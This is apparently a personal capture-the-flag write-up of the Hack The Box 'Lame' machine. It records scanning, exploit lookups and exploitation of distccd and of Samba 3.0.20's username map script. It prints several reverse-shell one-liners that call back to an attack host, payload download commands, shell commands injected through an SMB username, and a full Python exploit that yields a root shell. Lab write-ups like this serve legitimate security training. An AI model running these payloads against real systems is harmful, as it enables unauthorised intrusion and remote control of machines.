# lame - 10.10.10.3

# scan

```
❯ sudo rustscan --ulimit 5000 -a 10.10.10.3 -- -n -Pn -sV -sC -oA tcp-all
# didn't work?

❯ sudo nmap -n -Pn -sV -sC -oA tcp-all -T4 -p- -v 10.10.10.3
# derp, connect to VPN

❯ sudo rustscan --ulimit 5000 -a 10.10.10.3 -- -n -Pn -sV -sC -oA tcp-all
# filtered? maybe running too fast for VPN I'm on

❯ sudo nmap -n -Pn -sV -sC -oA tcp-all -T4 -p- -v 10.10.10.3

Nmap scan report for 10.10.10.3
Host is up (0.094s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-04-30T19:50:38-04:00
|_clock-skew: mean: 2h00m20s, deviation: 2h49m45s, median: 18s

```



# get access

Checking out FTP (port 21)

```sh
❯ nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
```

Searchsploit of ssh:

```sh
❯ searchsploit OpenSSH 4.7
----------------------------------------------------- -----------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- -----------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration             | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)       | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution         | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution               | linux/remote/45001.py
```

Searchsploit vsftpd:

```sh
❯ searchsploit vsFTPd 2.3.4
----------------------------------------------------- ----------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ----------------------------
vsftpd 2.3.4 - Backdoor Command Execution            | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploi | unix/remote/17491.rb
```

Looks like backdoor is present.

```sh
❯ searchsploit smbd 3.0.20
Exploits: No Results
```

WTF is distccd? From the [manpage](https://linux.die.net/man/1/distccd)

> *distccd* is the server for the ***[distcc](https://linux.die.net/man/1/distcc)**(1)* distributed compiler. It accepts and runs compilation jobs for network clients.
>
> distcc can run over either TCP or a connection command such as ***[ssh](https://linux.die.net/man/1/ssh)**(1)*. TCP connections are fast but relatively insecure. SSH connections are secure but slower.

Maybe useful for privesc? Seems to allow running remote code of some kind if I can figure out how to use it.

Trying backdoor. Reviewing Metasploit script and python script it looks like any alphanumeric username up to six characters, followed by a smiley (`:)`) will create a backdoor telnet shell on port 6200:

```sh
❯ nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
user blah :)
331 Please specify the password.
pass pass
530 Login incorrect.  # maybe no space allowed?
user user:)
331 Please specify the password.
pass pass
# hangs

❯ nc -v 10.10.10.3 6200
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: TIMEOUT.
# just times out every time?

# checking for other port being opened?
❯ sudo rustscan --ulimit 5000 -a 10.10.10.3 -- -n -Pn
# just see same as before
```

Tried without my VPN to see if that was the issue, but still getting timeout error?

Back to drawing board. Looking at SSH exploit 45001, it appears to rely on known user creds, but we don't have those. Unlikely but possible future privesc vector.

After review of https://seclists.org/fulldisclosure/2014/Oct/35, don't think it's useful. Helps get around restrictions on command execution, but that's it.

Noted DNS names in SMB enum:

- hackthebox.gr
- lame.hackthebox.gr

Added to /etc/hosts

Checking out SMB service

```sh
❯ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445	Name: hackthebox.gr
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```

Read/write on tmp!

```sh
❯ smbmap -R -H 10.10.10.3
	.\tmp\*
	dr--r--r--                0 Sat Apr 30 20:21:13 2022	.
	dw--w--w--                0 Sat Oct 31 02:33:57 2020	..
	dr--r--r--                0 Sat Apr 30 19:38:25 2022	.ICE-unix
	dw--w--w--                0 Sat Apr 30 19:38:54 2022	vmware-root
	dr--r--r--                0 Sat Apr 30 19:38:51 2022	.X11-unix
	fw--w--w--                0 Sat Apr 30 19:39:28 2022	5560.jsvc_up
	fw--w--w--               11 Sat Apr 30 19:38:51 2022	.X0-lock
	fw--w--w--             1600 Sat Apr 30 19:38:22 2022	vgauthsvclog.txt.0
	.\tmp\.X11-unix\*
	dr--r--r--                0 Sat Apr 30 19:38:51 2022	.
	dr--r--r--                0 Sat Apr 30 20:21:13 2022	..
	fr--r--r--                0 Sat Apr 30 19:38:51 2022	X0
```

Try to get OS info:

```sh
❯ smbmap -vH 10.10.10.3
[+] 10.10.10.3:445 is running Unix (name:LAME) (domain:LAME)
```

No luck.

Looking deeper at distccd. Web page says it lets you essentially compile code remotely on a bunch of machines (they are your workers). Wondering if there is any exploit for it, re-examining searchsploit:

```sh
❯ searchsploit distcc
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
DistCC Daemon - Command Execution (Metasploit)       | multiple/remote/9915.rb
```

Looks juicy! Found writeup online matching exact version:

- http://edublog.bitcrack.net/2016/10/pwning-metasploitable-2-exploiting_12.html

Don't want to use the metasploit module, so going to recreate it in a custom python script: [pwndistcc.py](pwn/pwndistcc.py)

Now using it:

```sh
# test code execution
❯ python3 pwndistcc.py id
b'DONE00000001STAT00000000'
b'SERR'
b'00000000'
b'SOUT'
b'0000002d'
stdout: uid=1(daemon) gid=1(daemon) groups=1(daemon)  # <==== BOOM
stdout: DOTO00000000

# tried uploading reverse shell with smbclient, but couldn't execute/chmod
# tried doing bash reverse shell, but that failed.

# trying python reverse shell
❯ python3 pwndistcc.py "which python"
b'DONE00000001STAT00000000'
b'SERR'
b'00000000'
b'SOUT'
b'00000010'
stdout: /usr/bin/python
stdout: DOTO00000000

# start listener
❯ nc -lvnp 9000
# create reverse shell
❯ python3 pwndistcc.py "python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.socket();s.connect((\"10.10.14.2\",9000));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
b'DONE00000001STAT00000000'
b'SERR'
b'00000000'
b'SOUT'
b'00000000'
```

And we get a callback!

# privesc

Interesting processes:

```
root      5601     1  0 19:38 ?        Sl     0:00 /usr/bin/rmiregistry
root      5606     1  0 19:38 ?        Sl     0:01 ruby /usr/sbin/druby_timeserver.rb
root      5611     1  0 19:38 ?        S      0:00 /usr/bin/unrealircd
root      5624     1  0 19:38 ?        S      0:01 Xtightvnc :0 -desktop X -auth /root/.Xauthority
```

- tomcat55
- /var/www
- nfs exports root file system no_root_sqash



---

Realized I didn't check searchsploit for Samba:

```
❯ searchsploit Samba 3.0.20
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                    | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Meta | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                     | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                     | linux/remote/7701.txt
```

Checking out the description for [exploit 16320](https://www.exploit-db.com/exploits/16320), it says:

```
This module exploits a command execution vulerability in Samba
versions 3.0.20 through 3.0.25rc3 when using the non-default
"username map script" configuration option. By specifying a username
containing shell meta characters, attackers can execute arbitrary
commands.

No authentication is needed to exploit this vulnerability since
this option is used to map usernames prior to authentication!
```

So we should be able to send in arbitrary shell commands through the username? Looking at the code confirms this:

```ruby
username = "/=`nohup " + payload.encoded + "`"
```

That looks simple enough to do through the command line without using metasploit.

```sh
# first, set up listener to catch pings sent our way
❯ sudo tcpdump -vvv -nn -i tun0 icmp

# then in another window, send payload that pings my attack box
❯ smbclient -L //10.10.10.3 -N -U '/=`ping -c3 10.10.14.2`'
```

And pings work! We have code execution! Now to try to get a reverse shell.

```sh
# start listener
❯ sudo nc -lvnp 443

# throw reverse shell command
❯ smbclient -L //10.10.10.3 -N -U $'/=`/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.14.2/443 0>&1\'`'
# but no callback?

# try python reverse shell
❯ smbclient -L //10.10.10.3 -N -U $'/=`python -c "import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.socket();s.connect((\"10.10.14.2\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"`'
# still no callback?

# try netcat reverse shell
❯ smbclient -L //10.10.10.3 -N -U '/=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 443 >/tmp/f`'
# still nothing?

# upload reverse shell with smbclient
❯ smbclient //10.10.10.3/tmp -N
smb: \> put pwn/rsh.elf rsh.elf

# try executing reverse shell
❯ smbclient -L //10.10.10.3 -N -U '/=$(chmod +x /tmp/rsh.elf; nohup /tmp/rsh.elf)'
# still nothing?
```

No callback for reverse shells... hmmm. Maybe I can download a reverse shell payload and execute?

```sh
# start web server
❯ sudo python3 -m http.server 80

# try download with wget
❯ smbclient -L //10.10.10.3 -N -U $'/=`wget 10.10.14.2/rsh.elf`'
# no request received?

# same thing with curl
❯ smbclient -L //10.10.10.3 -N -U $'/=`curl 10.10.14.2/rsh.elf -O rsh`'
# still nothing?

# trying more basic wget
❯ smbclient -L //10.10.10.3 -N -U $'/=`wget 10.10.14.2`'
# receive GET call!
```

Ok, so after wasting a ton of time on trial and error, realized that smbclient strips special characters like "/" from the username. Looking at the Meterpreter script, it uses an SMB library to connect. Googling for other scripts that exploit Samba usermap script, found many using python. Picked one and modified it slightly:

```python
#!/usr/bin/python3
# Modified from: https://raw.githubusercontent.com/NPTG24/Exploit-smb-3.0.20/main/smb-usermap.py
# Setup:
# ❯ python3 -m venv venv
# ❯ source venv/bin/activate
# ❯ pip install smb
# Usage:
# smb-usermap.py <VICTIM_IP>
# Reference - https://www.exploit-db.com/exploits/16320/

# change as required
LHOST = "10.10.14.8"
LPORT = 9000

from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs

smb_structs.SUPPORT_SMB2 = False
import sys

if len(sys.argv) < 2:
    print("\nUsage: python3 " + sys.argv[0] + " <VICTIM_IP>\n")
    sys.exit()

# Shellcode:
# msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.8 LPORT=9000 -f raw
cmd = f"mkfifo /tmp/b; nc {LHOST} {LPORT} 0</tmp/b | /bin/sh >/tmp/b 2>&1; rm /tmp/b"

username = f"/=` nohup {cmd}`"
password = ""
my_name = "derp"
remote_name = "derp"
con = SMBConnection(username, password, my_name, remote_name, use_ntlm_v2=False)
assert con.connect(sys.argv[1], 445)
```

Then tried running it:

```sh
# start netcat listener
❯ nc -lvnp 9000

# set up python virtual environment
❯ python3 -m venv venv
❯ source venv/bin/activate
❯ pip install smb

# run exploit
❯ python3 smb-usermap.py 10.10.10.3
```

And we get a root shell!

